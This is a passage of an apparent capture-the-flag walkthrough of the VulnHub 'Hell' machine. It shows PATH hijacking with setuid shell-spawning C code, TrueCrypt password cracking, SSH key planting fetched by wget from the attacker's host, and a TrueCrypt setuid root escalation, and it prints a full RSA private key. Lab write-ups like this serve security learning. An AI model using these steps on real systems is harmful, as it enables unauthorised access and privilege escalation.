+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ printenv PATH
+</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</span><span class='line'>$ export PATH=/tmp:$PATH
+</span><span class='line'>$ printenv PATH
+</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</span><span class='line'>$ ./game
+</span><span class='line'>I'm listening
+</span><span class='line'>$ whoami
+</span><span class='line'>george
+</span><span class='line'>$ id
+</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Bingo! I am <code>george</code> now. After poking around in the file system, I found <code>container.tc</code> file (which is a Truecrypt encrypted file) in george&rsquo;s home directory. Also george has an email which shows a clue to crack the encrypted file by using rockyou password dictionary.</p>
+
+<h2>Moving to <em>bazza</em></h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd
+</span><span class='line'>/home/george
+</span><span class='line'>$ ls -l
+</span><span class='line'>total 4096
+</span><span class='line'>-rw------- 1 george george 4194304 Jul 12 08:30 container.tc
+</span><span class='line'>$ find / -user george -perm -g=s -o -perm -u=s -type f 2>/dev/null
+</span><span class='line'>/usr/lib/openssh/ssh-keysign
+</span><span class='line'>/usr/lib/pt_chown
+</span><span class='line'>/usr/sbin/exim4
+</span><span class='line'>/usr/bin/chsh
+</span><span class='line'>/usr/bin/newgrp
+</span><span class='line'>/usr/bin/sudo
+</span><span class='line'>/usr/bin/procmail
+</span><span class='line'>/usr/bin/chfn
+</span><span class='line'>/usr/bin/gpasswd
+</span><span class='line'>/usr/bin/passwd
+</span><span class='line'>/usr/bin/sudoedit
+</span><span class='line'>/usr/bin/game.py
+</span><span class='line'>/usr/bin/lesson101
+</span><span class='line'>/sbin/mount.nfs
+</span><span class='line'>/var/mail/george
+</span><span class='line'>/bin/umount
+</span><span class='line'>/bin/ping
+</span><span class='line'>/bin/su
+</span><span class='line'>/bin/mount
+</span><span class='line'>/bin/ping6
+</span><span class='line'>$ ls -l /var/mail/george
+</span><span class='line'>total 4
+</span><span class='line'>-rw-r--r-- 1 george george 175 Jun 20  2014 signup.eml
+</span><span class='line'>$ cat /var/mail/george/signup.eml
+</span><span class='line'>From: admin@rockyou.com
+</span><span class='line'>To: super_admin@hell.com
+</span><span class='line'>Subject: Account Activation
+</span><span class='line'>Date: 13th November 2009
+</span><span class='line'>
+</span><span class='line'>Thanks for signing up for your account. I hope you enjoy our services. 
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I downloaded the container file <code>container.tc</code> to my Kali and use <code>truecrack</code> with rockyou.txt to crack the password. Due to my laptop do not have a strong GPU so I could not take advantage of hashcat which is really disappointed. T.T</p>
+
+<p>However, the hard way is still working, just a little slow&hellip; after waiting for a quite while, I finally cracked the password: <em><font color="red">letsyouupdateyourfunnotesandmore</font></em></p>
+
+<p><img class="left" src="/downloads/Hell1/5.png"></p>
+
+<p>In order to get a better shell with full privilege of george, I use ssh-keygen to generate a new ssh key pair (passphrase is <em><font color="red">test1337</font></em>) and upload the public key to target server as <code>.ssh/authorized_keys</code>. Then use the private key to login via SSH.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh-keygen
+</span><span class='line'>Generating public/private rsa key pair.
+</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): g_id_rsa
+</span><span class='line'>Enter passphrase (empty for no passphrase): 
+</span><span class='line'>Enter same passphrase again: 
+</span><span class='line'>Your identification has been saved in g_id_rsa.
+</span><span class='line'>Your public key has been saved in g_id_rsa.pub.
+</span><span class='line'>The key fingerprint is:
+</span><span class='line'>81:82:98:44:59:c7:f2:68:fe:b8:76:04:f1:b1:a2:97 root@kali
+</span><span class='line'>The key's randomart image is:
+</span><span class='line'>+--[ RSA 2048]----+
+</span><span class='line'>|.oo...           |
+</span><span class='line'>|.+ +.o .         |
+</span><span class='line'>|o . B + .        |
+</span><span class='line'>|   = =   .       |
+</span><span class='line'>|  + +   S        |
+</span><span class='line'>| . E .           |
+</span><span class='line'>|  . +            |
+</span><span class='line'>|   o o           |
+</span><span class='line'>|  ..o            |
+</span><span class='line'>+-----------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now back to target server to create <code>.ssh</code> folder and pull the SSH private key from my Kali.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir .ssh
+</span><span class='line'>$ cd .ssh
+</span><span class='line'>$ wget http://10.10.10.131/g_id_rsa.pub -O authorized_keys
+</span><span class='line'>--2015-07-16 10:19:59--  http://10.10.10.131/g_id_rsa.pub
+</span><span class='line'>Connecting to 10.10.10.131:80... connected.
+</span><span class='line'>HTTP request sent, awaiting response... 200 OK
+</span><span class='line'>Length: 391
+</span><span class='line'>Saving to: `authorized_keys'
+</span><span class='line'>
+</span><span class='line'>100%[==================================================================================================>] 391         --.-K/s   in 0s      
+</span><span class='line'>
+</span><span class='line'>2015-07-16 10:19:59 (59.7 MB/s) - `authorized_keys' saved [391/391]
+</span><span class='line'>
+</span><span class='line'>$ ls
+</span><span class='line'>authorized_keys
+</span><span class='line'>$ ls -l
+</span><span class='line'>total 4
+</span><span class='line'>-rw-r--r-- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
+</span><span class='line'>$ /bin/chmod 600 authorized_keys
+</span><span class='line'>$ ls -l
+</span><span class='line'>total 4
+</span><span class='line'>-rw------- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SSH login with password <em><font color="red">test1337</font></em></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh george@10.10.10.146 -i g_id_rsa
+</span><span class='line'>Enter passphrase for key 'g_id_rsa': 
+</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>No mail.
+</span><span class='line'>Last login: Thu Jul 16 10:14:43 2015 from 10.10.10.131
+</span><span class='line'>george@hell:~$ id
+</span><span class='line'>uid=1000(george) gid=1000(george) groups=1000(george),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+</span><span class='line'>george@hell:~$ pwd
+</span><span class='line'>/home/george
+</span><span class='line'>george@hell:~$ ls -l
+</span><span class='line'>total 4096
+</span><span class='line'>-rw------- 1 george george 4194304 Jul 12 08:30 container.tc
+</span><span class='line'>george@hell:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After get into the truecrypt container, I found a RSA private key file which should be someone&rsquo;s SSH key.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ truecrypt container.tc 
+</span><span class='line'>Enter mount directory [default]: 
+</span><span class='line'>Enter password for /home/george/container.tc: 
+</span><span class='line'>Enter keyfile [none]: 
+</span><span class='line'>Protect hidden volume (if any)? (y=Yes/n=No) [No]: 
+</span><span class='line'>george@hell:~$ df -h
+</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
+</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
+</span><span class='line'>udev                                                     10M     0   10M   0% /dev
+</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
+</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
+</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
+</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
+</span><span class='line'>/dev/mapper/truecrypt1                                  3.8M  2.0K  3.8M   1% /media/truecrypt1
+</span><span class='line'>george@hell:~$ cd /media/truecrypt1
+</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
+</span><span class='line'>total 2
+</span><span class='line'>-rwx------ 1 george george 1679 Jul  5  2014 id_rsa
+</span><span class='line'>george@hell:/media/truecrypt1$ cat id_rsa
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
+</span><span class='line'>25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
+</span><span class='line'>f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
+</span><span class='line'>t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
+</span><span class='line'>Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
+</span><span class='line'>gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
+</span><span class='line'>dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
+</span><span class='line'>0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
+</span><span class='line'>icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
+</span><span class='line'>AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
+</span><span class='line'>GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
+</span><span class='line'>w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
+</span><span class='line'>jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
+</span><span class='line'>6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
+</span><span class='line'>awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
+</span><span class='line'>Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
+</span><span class='line'>R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
+</span><span class='line'>2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
+</span><span class='line'>EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
+</span><span class='line'>EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
+</span><span class='line'>YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
+</span><span class='line'>W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
+</span><span class='line'>ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
+</span><span class='line'>rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
+</span><span class='line'>qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
+</span><span class='line'>-----END RSA PRIVATE KEY-----
+</span><span class='line'>george@hell:/media/truecrypt1$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I download the SSH private key file to my Kali and try use it to login accounts found before.(only <strong>bazza</strong> and <strong>oj</strong> left)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh bazza@10.10.10.146 -i tr_id_rsa 
+</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>You have mail.
+</span><span class='line'>Last login: Thu Jul 16 10:32:07 2015 from 10.10.10.131
+</span><span class='line'>$ id
+</span><span class='line'>uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
+</span><span class='line'>$ ls -alh   
+</span><span class='line'>total 40K
+</span><span class='line'>drwx------ 3 bazza bazza      4.0K Jul 17 08:35 .
+</span><span class='line'>drwxr-xr-x 7 root  root       4.0K Jul  5  2014 ..
+</span><span class='line'>-rw-r--r-- 1 root  root        109 Jul  6  2014 barrebas.txt
+</span><span class='line'>-rw------- 1 bazza bazza       492 Jul 13 01:33 .bash_history
+</span><span class='line'>-r-xr-sr-x 1 oj    developers 6.1K Jul  6  2014 part1
+</span><span class='line'>-r-sr-xr-x 1 oj    oj         5.2K Jul  6  2014 part2
+</span><span class='line'>drwx------ 2 bazza bazza      4.0K Jul  5  2014 .ssh
+</span><span class='line'>-rw------- 1 bazza bazza       781 Jul 13 01:42 .viminfo
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Moving to <strong>oj</strong></h2>
+
+<p>Here we found executable program: <code>part1</code> and <code>part2</code> which has sticky bit set and owned by <strong>oj</strong>, so here should give a close check.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./part1
+</span><span class='line'>Checking integrity of part2... Done!!
+</span><span class='line'>
+</span><span class='line'>Checking integrity of calling target... Done!!
+</span><span class='line'>
+</span><span class='line'>Binary and target confirmed.
+</span><span class='line'>
+</span><span class='line'>Can't touch this *nah na na na na naaaaaaaa nah*
+</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we can see that the running program has executed system command <code>id</code>. So very similar method used previously, I upload setuid.c and change it a little bit as follow and then gcc compile it to <code>/tmp/id</code>, then set environmental variable PATH to include <code>/tmp</code> at the beginning.</p>
+
+<figure class='code'><figcaption><span>baz2.c  (baz2.c)</span> <a href='/downloads/code/baz2.c'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'> <span class="n">setuid</span><span class="p">(</span> <span class="mi">1005</span> <span class="p">);</span>
+</span><span class='line'> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/id&quot;</span><span class="p">);</span>
+</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ gcc baz2.c -o /tmp/id
+</span><span class='line'>$ ls -l /tmp
+</span><span class='line'>total 8
+</span><span class='line'>-rwxr-xr-x 1 bazza bazza 5028 Jul 17 08:26 id
+</span><span class='line'>$ ./part1
+</span><span class='line'>Checking integrity of part2... Done!!
+</span><span class='line'>
+</span><span class='line'>Checking integrity of calling target... Done!!
+</span><span class='line'>
+</span><span class='line'>Binary and target confirmed.
+</span><span class='line'>
+</span><span class='line'>Can't touch this *nah na na na na naaaaaaaa nah*
+</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
+</span><span class='line'>oj
+</span><span class='line'>$ whoami
+</span><span class='line'>oj
+</span><span class='line'>$ /usr/bin/id
+</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, I am oj. :D</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami 
+</span><span class='line'>oj
+</span><span class='line'>$ ls -al
+</span><span class='line'>total 592
+</span><span class='line'>drwx------ 2 oj   oj     4096 Jul 17 23:48 .
+</span><span class='line'>drwxr-xr-x 7 root root   4096 Jul  5  2014 ..
+</span><span class='line'>-r-sr-xr-x 1 root root 592549 Jul  5  2014 echo
+</span><span class='line'>-rw-r--r-- 1 root root    154 Jul  5  2014 How to be an infosec rockstar 101.txt
+</span><span class='line'>$ ./echo AAAA-%p-%p 
+</span><span class='line'>AAAA-0x80488c0-0xbffffce8$ 
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here I found one executable file owned by <code>root</code> under oj&rsquo;s home folder and that file has sticky bit been set which could be a way to ROOT. Also <code>echo</code> program has <a href="https://www.owasp.org/index.php/Format_string_attack">Format String vulnerability</a></p>
+
+<h2>Getting ROOT</h2>
+
+<p>After suffering a lot of hours painful to deal with Format String exploit about <code>echo</code>. I still could not make it work for me :`(</p>
+
+<p>However, there is another way to privilege escape to ROOT, which has been demostrated by <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">vincius777</a></p>
+
+<figure class='code'><figcaption><span>getroot2.c  (getroot2.c)</span> <a href='/downloads/code/getroot2.c'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ df -h
+</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
+</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
+</span><span class='line'>udev                                                     10M     0   10M   0% /dev
+</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
+</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
+</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
+</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
+</span><span class='line'>/dev/mapper/truecrypt1                                  1.8M   26K  1.7M   2% /media/truecrypt1
+</span><span class='line'>george@hell:~$ cd /media/truecrypt1
+</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
+</span><span class='line'>total 18
+</span><span class='line'>-rwsrwxrwx 1 root root   152 Jul 17 17:13 getroot
+</span><span class='line'>-rwsrwxrwx 1 root root  4970 Jul 17 17:14 getroot2
+</span><span class='line'>drwx------ 2 root root 12288 Jul 17 17:09 lost+found
+</span><span class='line'>george@hell:/media/truecrypt1$ ./getroot2
+</span><span class='line'># id
+</span><span class='line'>uid=0(root) gid=1000(george) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(george)
+</span><span class='line'># pwd
+</span><span class='line'>/media/truecrypt1
+</span><span class='line'># whoami
+</span><span class='line'>root
+</span><span class='line'># cat /root/flag.txt
+</span><span class='line'>Congratulations of beating Hell. 
+</span><span class='line'>
+</span><span class='line'>I hope you enjoyed it and there weren't to many trolls in here for you. 
+</span><span class='line'>
+</span><span class='line'>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242
+</span><span class='line'>
